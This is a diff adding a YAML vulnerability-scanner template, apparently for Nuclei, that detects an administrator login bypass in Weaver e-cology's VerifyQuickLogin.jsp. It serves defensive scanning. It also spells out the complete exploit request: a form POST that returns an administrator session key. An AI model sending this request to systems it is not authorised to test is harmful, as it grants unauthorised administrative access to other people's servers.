@@ -1,0 +1,31 @@
+id: weaver-ecology-permission-bypass
+info:
+  name: Weaver E-cology VerifyQuickLogin.jsp Permission Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver e-cology has an arbitrary administrator user login vulnerability. Attackers can exploit the VerifyQuickLogin.jsp endpoint to bypass permissions, log in as administrator, and perform malicious operations.
+  reference:
+    - https://www.weaver.com.cn/
+  tags: permission-bypass
+http:
+  - raw:
+      - |
+        POST /mobile/plugin/VerifyQuickLogin.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        identifier=1&language=1&ipaddress=61.148.74.134
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "Set-Cookie: ecology_JSession"
+        part: header
+      - type: regex
+        regex:
+          - '\{"message":"1","sessionkey":".*?"\}'
+        part: body
